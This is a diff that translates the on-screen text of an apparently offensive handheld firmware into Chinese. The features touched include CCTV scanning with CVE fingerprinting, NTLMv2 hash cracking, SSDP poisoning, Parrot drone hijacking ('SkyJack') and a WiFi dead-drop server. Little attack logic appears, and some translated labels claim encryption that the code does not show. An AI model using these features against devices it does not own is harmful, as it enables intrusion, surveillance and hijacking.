     return false;
@@ -24453,7 +24681,7 @@ bool httpRequest(IPAddress ip, uint16_t port, const char* path, String& respHdr,
 
 void local_scan_CCTV() {
   if (WiFi.localIP().toString() == "0.0.0.0") {
-    waitAndReturnToMenu("Not connected...");
+    waitAndReturnToMenu("未连接网络...");
     return;
   }
 
@@ -24461,7 +24689,7 @@ void local_scan_CCTV() {
   hostslistCCTV.clear();
 
   M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
 
   IPAddress subnetMask = WiFi.subnetMask();
   IPAddress network = WiFi.localIP(); network[3] = 0;
@@ -24469,8 +24697,8 @@ void local_scan_CCTV() {
   M5.Display.clear();
   int numHosts = 254 - subnetMask[3];
   M5.Display.setCursor(5, M5.Display.height() / 2);
-  M5.Display.println("Probing " + String(numHosts) + " hosts with ARP");
-  M5.Display.println("       please wait...");
+  M5.Display.println("正在通过 ARP 探测 " + String(numHosts) + " 个主机");
+  M5.Display.println("       请稍候...");
 
   char base_ip[16];
   sprintf(base_ip, "%d.%d.%d.", network[0], network[1], network[2]);
@@ -24492,9 +24720,9 @@ void local_scan_CCTV() {
   }
 
   if (!foundHosts) {
-    M5.Display.println("No hosts found.");
+    M5.Display.println("未发现活跃主机。");
     delay(1500);
-    waitAndReturnToMenu("No hosts found.");
+    waitAndReturnToMenu("未发现活跃主机。");
     return;
   }
 }
@@ -25356,7 +25584,7 @@ void detectStreams(IPAddress ip, const std::vector<uint16_t>& ports) {
           goto AFTER_RTSP_PORT_SCAN;
         } else {
           // Interactif : proposer de continuer le crawl ou pas
-          bool go = confirmPopup("Random path returned 200\nFalse positive likely\nContinue crawling?");
+          bool go = confirmPopup("随机路径返回200\n极可能是误报\n是否继续爬取？");
           if (!go) {
             uiRefresh();
             Serial.println("[RTSP] Known-paths scan canceled by user (anti false-positive).");
@@ -25595,7 +25823,7 @@ void processCCTVHost(const IPAddress& ip) {
   }
 
   // Header line on TFT (small, concise)
-  M5.Display.setTextSize(1);
+  evilSetCnFont(M5.Display, 1);
   uiAppend("Targeting " + ip.toString() + " -> " + (brand.length()?brand:"(unknown)"), false);
 
   // 3) Fingerprint + CVE
@@ -25618,14 +25846,14 @@ void processCCTVHost(const IPAddress& ip) {
 /* ---------- Mode: scan local (LAN) ---------- */
 void scanCCTVCamerasLocal() {
   if (WiFi.localIP().toString() == "0.0.0.0") {
-    waitAndReturnToMenu("Not connected...");
+    waitAndReturnToMenu("未连接网络...");
     return; // retour au menu principal
   }
   local_scan_CCTV();   // Remplit hostslistCCTV par ARP
   std::vector<IPAddress> hosts = hostslistCCTV;
 
   if (hosts.empty()) {
-    waitAndReturnToMenu("No hosts to scan");
+    waitAndReturnToMenu("无待扫描的主机");
     return;
   }
 
@@ -25634,25 +25862,25 @@ void scanCCTVCamerasLocal() {
     cardUpdate();
     if (kp(KEY_BACKSPACE)) break; // retour menu
   }
-  waitAndReturnToMenu("CCTV scan done");
+  waitAndReturnToMenu("摄像头扫描已完成");
 }
 
 /* ---------- Mode: IP unique (WAN) ---------- */
 void scanCCTVCamerasSingleIP() {
   if (WiFi.localIP().toString() == "0.0.0.0") {
-    waitAndReturnToMenu("Not connected...");
+    waitAndReturnToMenu("未连接网络...");
     return;
   }
 
   IPAddress target;
   if (!promptIPv4(target)) {
-    waitAndReturnToMenu("Operation canceled");
+    waitAndReturnToMenu("操作已取消");
     return;
   }
 
   // Exécuter le même pipeline que pour un hôte LAN
   processCCTVHost(target);
-  waitAndReturnToMenu("CCTV scan (single IP) done");
+  waitAndReturnToMenu("单IP摄像头扫描完成");
 }
 
 
@@ -25689,20 +25917,20 @@ bool loadIPsFromSD(const char* path, std::vector<IPAddress>& out) {
 
 void scanCCTVCamerasFromFile() {
   if (WiFi.localIP().toString() == "0.0.0.0") {
-    waitAndReturnToMenu("Not connected...");
+    waitAndReturnToMenu("未连接网络...");
     return;
   }
 
   M5.Display.clear();
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   M5.Display.setCursor(5, 5);
-  M5.Display.println("Loading IPs from SD…");
+  M5.Display.println("正在从 SD 卡载入 IP…");
   M5.Display.println(CCTV_FILE);
   M5.Display.display();
 
   std::vector<IPAddress> list;
   if (!loadIPsFromSD(CCTV_FILE, list)) {
-    waitAndReturnToMenu("No IPs / file missing");
+    waitAndReturnToMenu("无有效IP或文件缺失");
     return;
   }
 
@@ -25724,7 +25952,7 @@ void scanCCTVCamerasFromFile() {
   // --- NEW: désactiver mode SD avant de quitter ---
   g_scanFromSD = false;
 
-  waitAndReturnToMenu("CCTV scan (file) done");
+  waitAndReturnToMenu("文件列表摄像头扫描完成");
 }
 
 
@@ -26585,11 +26813,11 @@ void mjpegSerialView(int idx) {
 
 void runCCTV_MJPEGViewer() {
   if (WiFi.localIP().toString() == "0.0.0.0") {
-    waitAndReturnToMenu("Not connected...");
+    waitAndReturnToMenu("未连接网络...");
     return; // retour au menu principal
   }
   enterDebounce();
-  M5.Display.setTextSize(1);
+  evilSetCnFont(M5.Display, 1);
 
   bool spiffs_ok = false;
   bool sd_ok = true;
@@ -26816,7 +27044,7 @@ const char* authToTextHC(wifi_auth_mode_t m) {
 }
 void drawSpycamScreenHC(const char* text, bool alert) {
   M5.Display.fillScreen(TFT_BLACK);
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   M5.Display.setCursor(5,0);
   M5.Display.setTextColor(alert ? TFT_RED : menuTextUnFocusedColor);
   M5.Display.println(text);
@@ -26873,12 +27101,12 @@ bool isSpyByOUIHC(const char* oui, char* reasonOut, size_t reasonLen) {
 // =========================
 void scanCCTV_SpyDectection() {
   M5.Display.fillScreen(menuBackgroundColor);
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   M5.Display.setTextColor(menuTextUnFocusedColor);
   M5.Display.setCursor(5, 5);
-  M5.Display.println("SpyCam Scan (HC)...");
-  M5.Display.setTextSize(1.5);
-  M5.Display.println("ENTER/BACK: exit");
+  M5.Display.println("隐蔽针孔摄像头扫描 (HC)...");
+  evilSetCnFont(M5.Display, 1.5);
+  M5.Display.println("按回车或退格键: 退出");
   M5.Display.display();
 
   spycamScanningHC = true;
@@ -26945,12 +27173,12 @@ void scanCCTV_SpyDectection() {
   }
 
   M5.Display.fillScreen(menuBackgroundColor);
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   M5.Display.setCursor(5, M5.Display.height()/2);
-  M5.Display.println("Stopping SpyCam scan...");
+  M5.Display.println("正在停止针孔摄像头扫描...");
   M5.Display.display();
   delay(700);
-  waitAndReturnToMenu("Return to menu");
+  waitAndReturnToMenu("返回菜单");
 }
 
 
@@ -26958,10 +27186,10 @@ void scanCCTV_SpyDectection() {
 void scanCCTVCameras() {
   if (WiFi.localIP().toString() == "0.0.0.0") {
     M5.Display.fillScreen(menuBackgroundColor);
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setCursor(5, M5.Display.height()/2);
     M5.Display.println("Not connected...");
-    M5.Display.println("Only SpyCam detector");
+    M5.Display.println("仅隐蔽摄像头探测器");
     M5.Display.display();
     delay(1000);
   }
@@ -27016,7 +27244,7 @@ void scanCCTVCameras() {
 
     if (sel < 0) {
       // BACKSPACE / Cancel dans le menu scan => retour au menu principal
-      waitAndReturnToMenu("Back To Main Menu");
+      waitAndReturnToMenu("返回主菜单");
       return;
     }
 
@@ -27341,8 +27569,8 @@ void dumpHex(const char *label, const uint8_t *buf, size_t len) {
 void drawNTLMInitUser(const String &user) {
   // Efface tout l'écran
   M5.Display.fillScreen(TFT_BLACK);
-  M5.Display.setTextSize(1.5);
-  M5.Display.setTextFont(1);
+  evilSetCnFont(M5.Display, 1.5);
+  evilKeepCnFont(M5.Display);
   M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
   M5.Display.setCursor(5, 20);
 
@@ -27351,21 +27579,21 @@ void drawNTLMInitUser(const String &user) {
   if (shortUser.length() > 36) {
     shortUser = shortUser.substring(0, 33) + "...";
   }
-  M5.Display.println("User: " + shortUser);
+  M5.Display.println("用户: " + shortUser);
 
   // Réserve la ligne suivante pour compteur
   M5.Display.setCursor(5, 40);
-  M5.Display.println("Tried: 0");
+  M5.Display.println("已尝试: 0");
 }
 
 void drawNTLMTries(uint32_t tried) {
   // Met à jour uniquement la ligne "Tried"
   M5.Display.fillRect(0, 40, 240, 12, TFT_BLACK);
-  M5.Display.setTextSize(1.5);
-  M5.Display.setTextFont(1);
+  evilSetCnFont(M5.Display, 1.5);
+  evilKeepCnFont(M5.Display);
   M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
   M5.Display.setCursor(5, 40);
-  M5.Display.print("Tried: ");
+  M5.Display.print("已尝试: ");
   M5.Display.println(tried);
 }
 
@@ -27374,8 +27602,8 @@ void drawNTLMResult(const String &msg, bool success = false) {
   int y = 75; // ↓ descendu pour ne pas chevaucher le H/s
 
   M5.Display.fillRect(0, y, 240, 12, TFT_BLACK);
-  M5.Display.setTextSize(1.5);
-  M5.Display.setTextFont(1);
+  evilSetCnFont(M5.Display, 1.5);
+  evilKeepCnFont(M5.Display);
   M5.Display.setTextColor(success ? TFT_GREEN : TFT_RED, TFT_BLACK);
   M5.Display.setCursor(5, y);
 
@@ -27443,11 +27671,11 @@ void drawProgressBar(uint32_t current, uint32_t total) {
 void drawHashrate(uint32_t hps) {
   // Met à jour uniquement la ligne Hash/s
   M5.Display.fillRect(0, 55, 240, 12, TFT_BLACK);
-  M5.Display.setTextSize(1.5);
-  M5.Display.setTextFont(1);
+  evilSetCnFont(M5.Display, 1.5);
+  evilKeepCnFont(M5.Display);
   M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
   M5.Display.setCursor(5, 55);
-  M5.Display.print("Speed: ");
+  M5.Display.print("破解速度: ");
   M5.Display.print(hps);
   M5.Display.println(" H/s");
 }
@@ -27461,7 +27689,7 @@ void crackNTLMv2() {
   File hf = SD.open("/evil/NTLM/ntlm_hashes.txt", FILE_READ);
   if (!hf) {
     Serial.println("[ERROR] Cannot open /evil/NTLM/ntlm_hashes.txt");
-    waitAndReturnToMenu("Back To Main Menu");
+    waitAndReturnToMenu("返回主菜单");
     return;
   }
 
@@ -27471,12 +27699,12 @@ void crackNTLMv2() {
 
     M5.Display.fillScreen(TFT_BLACK);
     M5.Display.setCursor(20, 50);
-    M5.Display.setTextSize(1);
+    evilSetCnFont(M5.Display, 1);
     M5.Display.setTextColor(TFT_RED, TFT_BLACK);
-    M5.Display.println("ntlm_hashes.txt is empty!");
+    M5.Display.println("ntlm_hashes.txt 为空！");
     delay(2000);
 
-    waitAndReturnToMenu("Back To Main Menu");
+    waitAndReturnToMenu("返回主菜单");
     return;
   }
   bool stopRequested = false;
@@ -27639,7 +27867,7 @@ void crackNTLMv2() {
     delay(1000);
   }
   hf.close();
-  waitAndReturnToMenu("Back To Main Menu");
+  waitAndReturnToMenu("返回主菜单");
 }
 
 
@@ -27680,10 +27908,10 @@ void drawCleanerUI(const char* title,
 {
   // Fond
   M5.Display.fillScreen(TFT_BLACK);
-  M5.Display.setTextFont(1);
+  evilKeepCnFont(M5.Display);
 
   // Header (compact style)
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   M5.Display.setTextColor(titleColor, TFT_BLACK);
   M5.Display.setCursor(0, 2);
   M5.Display.println(title);
@@ -27701,24 +27929,24 @@ void drawCleanerUI(const char* title,
   M5.Display.fillRect(barX + 1, barY + 1, fillW, barH - 2, TFT_GREEN);
 
   // Percent text
-  M5.Display.setTextSize(1);
+  evilSetCnFont(M5.Display, 1);
   M5.Display.setTextColor(menuTextFocusedColor, TFT_BLACK);
   M5.Display.setCursor(barX, barY + 14);
-  M5.Display.printf("Progress: %d%%", percent);
+  M5.Display.printf("破解进度: %d%%", percent);
 
   // Stats (compact)
   M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
   M5.Display.setCursor(0, 62);
-  M5.Display.printf("Total  : %lu\n", (unsigned long)st.totalLines);
-  M5.Display.printf("Kept   : %lu\n", (unsigned long)st.keptLines);
-  M5.Display.printf("Dup    : %lu\n", (unsigned long)st.dupLines);
-  M5.Display.printf("Invalid: %lu\n", (unsigned long)st.invalidLines);
+  M5.Display.printf("总数   : %lu\n", (unsigned long)st.totalLines);
+  M5.Display.printf("保留   : %lu\n", (unsigned long)st.keptLines);
+  M5.Display.printf("重复   : %lu\n", (unsigned long)st.dupLines);
+  M5.Display.printf("无效   : %lu\n", (unsigned long)st.invalidLines);
 
   // Hint
   if (showCancelHint) {
     M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
     M5.Display.setCursor(0, 122);
-    M5.Display.print("BACKSPACE: abort");
+    M5.Display.print("按退格键: 中止");
   }
 
   M5.Display.display();
@@ -27726,24 +27954,24 @@ void drawCleanerUI(const char* title,
 
 void drawResultUI(bool ok, const CleanStats& st) {
   M5.Display.fillScreen(TFT_BLACK);
-  M5.Display.setTextFont(1);
+  evilKeepCnFont(M5.Display);
 
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   M5.Display.setTextColor(ok ? TFT_GREEN : TFT_RED, TFT_BLACK);
   M5.Display.setCursor(0, 10);
-  M5.Display.println(ok ? "Cleanup done!" : "Cleanup failed!");
+  M5.Display.println(ok ? "字典去重完成！" : "字典去重失败！");
 
-  M5.Display.setTextSize(1);
+  evilSetCnFont(M5.Display, 1);
   M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
   M5.Display.setCursor(0, 40);
-  M5.Display.printf("Total  : %lu\n", (unsigned long)st.totalLines);
-  M5.Display.printf("Kept   : %lu\n", (unsigned long)st.keptLines);
-  M5.Display.printf("Dup    : %lu\n", (unsigned long)st.dupLines);
-  M5.Display.printf("Invalid: %lu\n", (unsigned long)st.invalidLines);
+  M5.Display.printf("总数   : %lu\n", (unsigned long)st.totalLines);
+  M5.Display.printf("保留   : %lu\n", (unsigned long)st.keptLines);
+  M5.Display.printf("重复   : %lu\n", (unsigned long)st.dupLines);
+  M5.Display.printf("无效   : %lu\n", (unsigned long)st.invalidLines);
 
   M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
   M5.Display.setCursor(0, 122);
-  M5.Display.print("ENTER: back");
+  M5.Display.print("按回车键: 返回");
 
   M5.Display.display();
 }
@@ -27869,7 +28097,7 @@ void CleanNTLMHashes() {
   const char* path = "/evil/NTLM/ntlm_hashes.txt";
 
   // popup Evil-Cardputer (Y/N) :contentReference[oaicite:1]{index=1}
-  if (!confirmPopup("Clean NTLMv2\nDuplicates ? (y/n)")) {
+  if (!confirmPopup("清理 NTLMv2 哈希\n重复项？(y/n)")) {
     Serial.println("[INFO] User cancelled duplicate cleanup.");
     waitAndReturnToMenu("Aborted.");
     return;
@@ -27877,8 +28105,8 @@ void CleanNTLMHashes() {
 
   if (!SD.exists(path)) {
     Serial.printf("[WARN] File not found: %s\n", path);
-    okPopup("File not found");   // popup OK style :contentReference[oaicite:2]{index=2}
-    waitAndReturnToMenu("Missing file");
+    okPopup("未找到文件");   // popup OK style :contentReference[oaicite:2]{index=2}
+    waitAndReturnToMenu("文件缺失");
     return;
   }
 
@@ -27905,7 +28133,7 @@ void CleanNTLMHashes() {
     delay(10);
   }
 
-  waitAndReturnToMenu("Back to menu");
+  waitAndReturnToMenu("返回菜单");
 }
 
 
@@ -28182,7 +28410,7 @@ void selectTypesUI() {
     if (needRedraw) {
       auto& d = M5Cardputer.Display;
       d.fillScreen(BLACK);
-      d.setTextSize(1.5);
+      evilSetCnFont(d, 1.5);
       d.setTextColor(TFT_WHITE, BLACK);
 
       // Ligne Select All
@@ -28242,38 +28470,38 @@ void updateFakeSSDPUI() {
   auto& d = M5Cardputer.Display;
   d.fillScreen(BLACK);
 
-  d.setTextSize(2);
+  evilSetCnFont(d, 2);
   d.setTextColor(TFT_GREEN, BLACK);
   d.setCursor(5, 5);
-  d.print("Poisoning SSDP");
+  d.print("正在进行 SSDP 毒化");
 
-  d.setTextSize(1);
+  evilSetCnFont(d, 1);
   d.setTextColor(WHITE, BLACK);
   d.setCursor(5, 30);
-  d.print("M-SEARCH recv: ");
-  d.setTextSize(2);
+  d.print("接收 M-SEARCH: ");
+  evilSetCnFont(d, 2);
   d.print(ssdpSearchCount);
 
-  d.setTextSize(1);
+  evilSetCnFont(d, 1);
   d.setCursor(0, 50);
   d.print(lastSSDPService);
 
-  d.setTextSize(1);
+  evilSetCnFont(d, 1);
   d.setCursor(5, 70);
-  d.print("SSDP sent: ");
-  d.setTextSize(2);
+  d.print("已发送 SSDP: ");
+  evilSetCnFont(d, 2);
   d.print(ssdpSentCount);
 
-  d.setTextSize(1);
+  evilSetCnFont(d, 1);
   d.setCursor(5, 100);
-  d.print("Client: ");
-  d.setTextSize(2);
+  d.print("客户端: ");
+  evilSetCnFont(d, 2);
   d.print(lastSSDPClient);
 
-  d.setTextSize(1);
+  evilSetCnFont(d, 1);
   d.setTextColor(TFT_DARKGREY, BLACK);
   d.setCursor(5, d.height()-12);
-  d.print("Press BACKSPACE to exit");
+  d.print("按 BACKSPACE 退出");
 }
 
 #include "lwip/igmp.h"
@@ -28282,10 +28510,10 @@ void fakeSSDP() {
 
   // 1) Nombre de devices
   M5Cardputer.Display.fillScreen(BLACK);
-  M5Cardputer.Display.setTextSize(1.5);
+  evilSetCnFont(M5Cardputer.Display, 1.5);
   M5Cardputer.Display.setTextColor(TFT_WHITE, TFT_BLACK);
   M5Cardputer.Display.setCursor(0, 0);
-  M5Cardputer.Display.print("How many devices? (1-300)");
+  M5Cardputer.Display.print("模拟设备数量? (1-300)");
   String input = getUserInput();
   int val = input.toInt();
   if (val < 1) val = 1;
@@ -28294,15 +28522,15 @@ void fakeSSDP() {
   Serial.printf("[*] User selected %d devices\n", ssdpDeviceCount);
 
   // 2) Noms depuis SD ou custom
-  bool useSD = confirmPopup("Use SSDPName.txt from SD?");
+  bool useSD = confirmPopup("从SD卡使用 SSDPName.txt？");
   if (useSD) {
     loadDeviceNames();
   } else {
     M5Cardputer.Display.fillScreen(BLACK);
-    M5Cardputer.Display.setTextSize(1.5);
+    evilSetCnFont(M5Cardputer.Display, 1.5);
     M5Cardputer.Display.setTextColor(TFT_WHITE, TFT_BLACK);
     M5Cardputer.Display.setCursor(0, 0);
-    M5Cardputer.Display.print("Custom name?");
+    M5Cardputer.Display.print("自定义设备名称？");
     String customName = getUserInput();
     gNames.clear(); gNames.emplace_back();
     strncpy(gNames[0].data(), customName.c_str(), NAME_MAX_LEN);
@@ -28334,14 +28562,14 @@ void fakeSSDP() {
     // 1) Multicast
     if (!udpSSDPmc.beginMulticast(IPAddress(239,255,255,250), 1900)) {
       Serial.println("[-] beginMulticast SSDP failed");
-      waitAndReturnToMenu("SSDP Error");
+      waitAndReturnToMenu("SSDP 发生错误");
       return;
     }
 
     // 2) Unicast/Broadcast sur 1900 (fallback si AP convertit MCast->UCast)
     if (!udpSSDPuc.begin(1900)) {
       Serial.println("[-] begin UDP/1900 failed");
-      waitAndReturnToMenu("SSDP Error");
+      waitAndReturnToMenu("SSDP 发生错误");
       return;
     }
 
@@ -28469,7 +28697,7 @@ void fakeSSDP() {
     isFakeSSDPActive = false;
     ssdpServer.stop();
     server.begin();
-    waitAndReturnToMenu("SSDP Poisoner stopped");
+    waitAndReturnToMenu("SSDP 毒化已停止");
     return;
 
   } else {
@@ -28477,7 +28705,7 @@ void fakeSSDP() {
     isFakeSSDPActive = false;
     ssdpServer.stop();
     server.begin();
-    waitAndReturnToMenu("SSDP Poisoner stopped");
+    waitAndReturnToMenu("SSDP 毒化已停止");
     return;
   }
 }
@@ -28524,7 +28752,7 @@ void drawSkyjackStatus(const char* msg) {
 
   M5.Display.setCursor(5, skyjackCursorY);
   M5.Display.setTextColor(TFT_GREEN, TFT_BLACK);
-  M5.Display.setTextSize(1);
+  evilSetCnFont(M5.Display, 1);
   M5.Display.println(">> " + String(msg));
   skyjackCursorY += lineHeight;
 
@@ -28561,7 +28789,7 @@ void sendATCommandToDrone(WiFiClient& client, const String& command) {
 void skyjackDroneMode() {
   M5.Display.clear();
   M5.Display.setCursor(5, 20);
-  M5.Display.setTextSize(1.7);
+  evilSetCnFont(M5.Display, 1.7);
   M5.Display.setTextColor(TFT_GREEN);
   drawSkyjackStatus(">> SKYJACK MODE <<");
 
@@ -28599,7 +28827,7 @@ void skyjackDroneMode() {
 
   if (parrotSSID == "") {
     drawSkyjackStatus("No Parrot drones found.");
-    waitAndReturnToMenu("No Parrot drones.");
+    waitAndReturnToMenu("未发现 Parrot 无人机。");
     return;
   }
 
@@ -28647,7 +28875,7 @@ void skyjackDroneMode() {
 
   if (!connected) {
     drawSkyjackStatus("Connection failed.");
-    waitAndReturnToMenu("Fail connect.");
+    waitAndReturnToMenu("连接无人机失败。");
     return;
   }
 
@@ -28671,7 +28899,7 @@ void skyjackDroneMode() {
 
   delay(1000);
   WiFi.disconnect(true);
-  waitAndReturnToMenu("SkyJack done.");
+  waitAndReturnToMenu("SkyJack 劫持完成。");
 }
 
 
@@ -28820,12 +29048,12 @@ void ddDrawHeader(const char* title) {
   M5.Display.fillRect(0, 0, 240, 18, TFT_DARKCYAN);
   M5.Display.drawFastHLine(0, 18, 240, TFT_BLACK);
   M5.Display.setTextColor(TFT_BLACK, TFT_DARKCYAN);
-  M5.Display.setTextSize(1);
+  evilSetCnFont(M5.Display, 1);
   M5.Display.setCursor(6, 4); M5.Display.print(title);
 }
 
 void ddDrawTextLine(int x, int y, const char* label, const char* value) {
-  M5.Display.setTextSize(1);
+  evilSetCnFont(M5.Display, 1);
   M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
   M5.Display.setCursor(x, y); M5.Display.print(label);
   M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
@@ -28834,7 +29062,7 @@ void ddDrawTextLine(int x, int y, const char* label, const char* value) {
 
 void ddDrawTileFrame(int x, int y, int w, int h, const char* caption) {
   M5.Display.drawRoundRect(x, y, w, h, 5, TFT_DARKGREY);
-  M5.Display.setTextSize(1);
+  evilSetCnFont(M5.Display, 1);
   M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
   M5.Display.setCursor(x + 6, y + 4); M5.Display.print(caption);
   int clearY = y + 13;
@@ -28880,10 +29108,10 @@ void ddDashboardInit(const char* ssid, const String& ip) {
   ddDrawTileFrame(6,   78, 72, 24, "Files");
   ddDrawTileFrame(84,  78, 150,24, "IO KB/s (up/down)");
 
-  M5.Display.setTextSize(1);
+  evilSetCnFont(M5.Display, 1);
   M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
-  M5.Display.setCursor(6,   106); M5.Display.print("Clients");
-  M5.Display.setCursor(126, 106); M5.Display.print("Throughput");
+  M5.Display.setCursor(6,   106); M5.Display.print("客户端数");
+  M5.Display.setCursor(126, 106); M5.Display.print("实时吞吐量");
 
   // Clients graph
   ddDrawSparkline(6,   115, 108, 18, ddClientsHist, DD_HIST_LEN, ddHistHead, TFT_GREEN, true);
@@ -28896,7 +29124,7 @@ void ddDashboardInit(const char* ssid, const String& ip) {
 inline void ddDrawValueInTile(int x, int y, int w, int h, const char* txt) {
   int clearY = y + 13;
   M5.Display.fillRect(x + 1, clearY, w - 2, h - (clearY - y) - 2, TFT_BLACK);
-  M5.Display.setTextSize(1);
+  evilSetCnFont(M5.Display, 1);
   M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
   M5.Display.setCursor(x + 6, y + h - 10); M5.Display.print(txt);
 }
@@ -29005,7 +29233,7 @@ void setupDeadDropRoutes() {
   ddServer.on("/", HTTP_GET, [](AsyncWebServerRequest * req) {
     String html;
     html += "<!doctype html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>";
-    html += "<title>WiFi Dead Drop</title>";
+    html += "<title>WiFi 匿名数字死信箱</title>";
     html += "<style>";
     html += "body{background:#111;color:#ddd;font-family:Consolas,monospace;text-align:center;margin:0;padding:0;}";
     html += ".container{max-width:500px;margin:40px auto;padding:20px;}";
@@ -29023,24 +29251,24 @@ void setupDeadDropRoutes() {
     html += "</style></head><body>";
   
     html += "<div class='container'>";
-    html += "<h2>WiFi Dead Drop</h2>";
-    html += "<p>Welcome to the underground dead drop. Share files or leave notes.</p>";
+    html += "<h2>WiFi 匿名数字死信箱</h2>";
+    html += "<p>欢迎来到秘密死信箱。您可以自由分享文件或投递加密留言。</p>";
   
     // Upload section
-    html += "<h3>Upload a File</h3>";
+    html += "<h3>投递 / 上传文件</h3>";
     html += "<input id='f' class='block' type='file'>";
-    html += "<button class='block' onclick='up()'>Upload</button>";
+    html += "<button class='block' onclick='up()'>开始上传</button>";
     html += "<progress id='prog' value='0' max='100' style='display:none'></progress>";
     html += "<div id='status'></div>";
   
     // Note section
-    html += "<h3>Leave a Note</h3>";
+    html += "<h3>投递加密留言</h3>";
     html += "<form method='post' action='/dd-note'>";
-    html += "<textarea class='block' name='msg' rows='3' maxlength='1024' placeholder='Drop your message here...'></textarea>";
-    html += "<button class='block' type='submit'>Publish</button></form>";
+    html += "<textarea class='block' name='msg' rows='3' maxlength='1024' placeholder='在此输入您的秘密留言...'></textarea>";
+    html += "<button class='block' type='submit'>发布留言</button></form>";
   
     // Link to deposits
-    html += "<p style='margin-top:20px'><a href='/dd-list'>&#128193; View Deposits</a></p>";
+    html += "<p style='margin-top:20px'><a href='/dd-list'>&#128193; 查看所有存件箱</a></p>";
   
     // Footer
     html += "<hr style='border:0;border-top:1px solid #333;margin:20px 0'>";
@@ -29051,10 +29279,10 @@ void setupDeadDropRoutes() {
     html += "function human(x){if(x<1024)return x+' B';if(x<1048576)return(x/1024).toFixed(1)+' KB';if(x<1073741824)return(x/1048576).toFixed(1)+' MB';return(x/1073741824).toFixed(1)+' GB';}";
     html += "function up(){";
     html += " var f=document.getElementById('f').files[0];";
-    html += " if(!f){alert('Select a file');return;}";
+    html += " if(!f){alert('请先选择要上传的文件！');return;}";
     html += " var p=document.getElementById('prog');";
     html += " var s=document.getElementById('status');";
-    html += " p.style.display='block';p.value=0;s.textContent='Starting upload...';";
+    html += " p.style.display='block';p.value=0;s.textContent='正在开始上传...';";
     html += " var start=Date.now();";
     html += " var xhr=new XMLHttpRequest();xhr.open('POST','/dd-upload',true);";
     html += " xhr.upload.onprogress=function(e){";
@@ -29066,8 +29294,8 @@ void setupDeadDropRoutes() {
     html += "     s.textContent='Uploading '+percent+'% ('+human(e.loaded)+' / '+human(e.total)+', '+speed+' KB/s)';";
     html += "   }";
     html += " };";
-    html += " xhr.onload=function(){s.textContent='Upload complete';window.location='/dd-list';};";
-    html += " xhr.onerror=function(){s.textContent='Upload failed';};";
+    html += " xhr.onload=function(){s.textContent='上传成功！';window.location='/dd-list';};";
+    html += " xhr.onerror=function(){s.textContent='上传失败，请重试！';};";
     html += " var form=new FormData();form.append('data',f,f.name);xhr.send(form);";
     html += "}";
     html += "</script>";
@@ -29095,8 +29323,8 @@ void setupDeadDropRoutes() {
     html += "th,td{text-align:left;padding:6px;border-bottom:1px solid #222;}";
     html += "th{color:#0ff;font-size:14px;} td{font-size:13px;}";
     html += "</style></head><body>";
-    html += "<h3>📂 Uploaded Files</h3>";
-    html += "<table><tr><th>Name</th><th>Size</th></tr>";
+    html += "<h3>📂 已投递的文件列表</h3>";
+    html += "<table><tr><th>文件名</th><th>大小</th></tr>";
     while (true) {
       File f = dir.openNextFile();
       if (!f) break;
@@ -29113,7 +29341,7 @@ void setupDeadDropRoutes() {
       f.close();
     }
     dir.close();
-    html += "</table><p><a href='/'>⬅ Back</a></p></body></html>";
+    html += "</table><p><a href='/'>⬅ 返回信箱首页</a></p></body></html>";
     req->send(200, "text/html", html);
   });
 
@@ -29352,7 +29580,7 @@ void WifiDeadDrop() {
   WiFi.softAPdisconnect(true);
   WiFi.mode(WIFI_MODE_APSTA);   // keep STA up for the rest of the app
 
-  waitAndReturnToMenu("Dead Drop stopped");
+  waitAndReturnToMenu("数字死信箱已停止");
 }
 
 /* sync WebServer fallback removed — async only */
@@ -29396,7 +29624,7 @@ void setupDeadDropRoutesSync() {
   server.on("/", HTTP_GET, []() {
     String html;
     html += "<!doctype html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>";
-    html += "<title>WiFi Dead Drop</title>";
+    html += "<title>WiFi 匿名数字死信箱</title>";
     html += "<style>";
     html += "body{background:#111;color:#ddd;font-family:Consolas,monospace;text-align:center;margin:0;padding:0;}";
     html += ".container{max-width:500px;margin:40px auto;padding:20px;}";
@@ -29414,21 +29642,21 @@ void setupDeadDropRoutesSync() {
     html += "</style></head><body>";
 
     html += "<div class='container'>";
-    html += "<h2>WiFi Dead Drop</h2>";
-    html += "<p>Welcome to the underground dead drop. Share files or leave notes.</p>";
+    html += "<h2>WiFi 匿名数字死信箱</h2>";
+    html += "<p>欢迎来到秘密死信箱。您可以自由分享文件或投递加密留言。</p>";
 
-    html += "<h3>Upload a File</h3>";
+    html += "<h3>投递 / 上传文件</h3>";
     html += "<input id='f' class='block' type='file'>";
-    html += "<button class='block' onclick='up()'>Upload</button>";
+    html += "<button class='block' onclick='up()'>开始上传</button>";
     html += "<progress id='prog' value='0' max='100' style='display:none'></progress>";
     html += "<div id='status'></div>";
 
-    html += "<h3>Leave a Note</h3>";
+    html += "<h3>投递加密留言</h3>";
     html += "<form method='post' action='/dd-note'>";
-    html += "<textarea class='block' name='msg' rows='3' maxlength='1024' placeholder='Drop your message here...'></textarea>";
-    html += "<button class='block' type='submit'>Publish</button></form>";
